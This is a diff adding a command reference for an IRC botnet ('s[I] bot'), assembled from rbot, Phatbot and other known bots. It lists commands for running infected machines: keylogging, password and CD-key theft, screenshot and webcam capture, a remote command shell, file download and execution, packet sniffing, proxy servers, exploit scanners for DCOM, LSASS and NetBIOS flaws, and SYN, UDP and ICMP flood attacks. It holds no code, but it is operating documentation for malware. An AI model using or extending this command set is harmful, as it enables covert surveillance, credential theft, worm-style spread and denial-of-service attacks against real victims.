@@ -1,0 +1,131 @@
+s[I] bot by starlock for sourceindustries
+Base bots used: NZM, Forbot, Phatbot stoney, rbot pk6.5 and bBot Private
+
+irc.act				-- login 
+irc.lo				-- logout
+irc.rn				-- rename bot
+irc.ver				-- send version request from bot
+irc.rc				-- reconnect bot
+irc.dc				-- disconnect bot
+irc.q				-- quit bot
+irc.st				-- bot uptime
+irc.id				-- bot id
+irc.tl				-- bot threads list
+irc.tk				-- bot thread kill
+irc.al				-- bot alias list
+irc.lg.on/off			-- bot log
+irc.clg				-- clear log
+irc.rmb				-- remove bot
+irc.who				-- lists users logged in
+irc.farp				-- flushes ARP cache
+irc.fdns				-- flushes DNS cache
+irc.crash				-- crash bot
+irc.rn				-- rename bot
+irc.j				-- make bot join channel
+irc.pt				-- make bot part channel
+irc.raw				-- perform raw command
+irc.pr				-- change bot prefix
+irc.se				-- change server
+irc.dns				-- resolve a dns
+irc.gh				-- gethost
+irc.aa				-- add alias
+irc.pm				-- send privmsg 
+irc.ac				-- send action command
+irc.cy				-- cycle channel
+irc.m				-- change mode
+irc.rp				-- repeat function
+irc.de				-- delay function
+
+web.v				-- visit a link
+web.dl.up				-- download update
+web.dl.g				-- download a file
+web.email			-- send email
+web.hcon				-- connect to a website
+web.ftp.ul			-- ftp upload
+
+mirc.cmd				-- send a mirc command
+mirc.dcc.get			-- get a file through DCC
+
+irc.clone.st			-- start a clone
+irc.clone.off			-- kill clone
+irc.clone.q			-- clone quit
+irc.clone.rn			-- clone rename
+irc.clone.raw			-- clone raw commands
+irc.clone.m			-- clone set mode
+irc.clone.ni			-- clone nick settings
+irc.clone.j			-- clone join chan
+irc.clone.p			-- clone part chan
+irc.clone.pm			-- clone priv msg
+irc.clone.ac			-- clone action command
+
+sniff on/off			-- packet sniffer
+
+sys.rb				-- reboot system
+sys.ni				-- network info
+sys.si				-- system info
+sys.di				-- system drive info
+sys.dll				-- test dlls
+sys.key				-- list cdkeys
+sys.fp				-- find passwords
+sys.up				-- system uptime
+sys.o				-- open file
+sys.kpn				-- kill process name
+sys.kpid				-- kill process id
+sys.del				-- delete file
+sys.fl				-- list files
+sys.rf				-- read files
+sys.net				-- issue net commands
+sys.cap				-- take screenshots
+sys.cap drivers/frame/video	-- capture drivers/webcam frames/amateur video
+sys.e				-- execute files
+sys.rn				-- rename files
+sys.cmd.on/off			-- remote command prompt
+sys.cmd				-- send commands
+sys.ld.on/off/stop			-- secure system
+sys.ff				-- find file
+sys.ff.off				-- find file function off
+sys.ps.on/off			-- process listing 
+sys.kl on/off			-- keylog 
+
+server.ident on/off			-- ident server 
+server.s4.off			-- socks4 server off
+server.web.on/off			-- webserver
+server.rd				-- create redirect ( port to ip port)
+server.rd.off			-- redirect server off
+server.tf.on/off			-- tftp server	
+
+root.s				-- start scanning
+root.stop				-- stop scanning
+root.stats				-- scan stats
+root.ci				-- current ip
+root.mass			-- scanall settings
+root.ps				-- port scan
+
+rape.ssf				-- supersyn flood ( ip, port, length)
+rape.sf				-- regular syn flood ( ip, port, length)
+rape.ic				-- icmp flood ( ip, length, spoof (true/false))
+rape.uf				-- udp flood ( ip, amount, size, delay)
+rape.pf				-- ping flood ( ip, amount, size, delay)
+rape.tf				-- tcp flood
+rape.df.off			-- ddos flood off
+rape.sf.off			-- syn flood off
+rape.uf.off			-- udp flood off
+rape.pf.off			-- ping flood off
+
+
+Scanners
+
+dal				-- dcass
+d1				-- dcom135
+d2				-- dcom445
+d3				-- dcom1025
+l1				-- lsass445
+l2				-- lsass135
+l3				-- lsass139
+w				-- wks
+w1				-- wks Eng
+w2				-- wks Oth
+a1				-- asn445
+a2				-- asn139
+nb				-- netbios
+np				-- ntpass
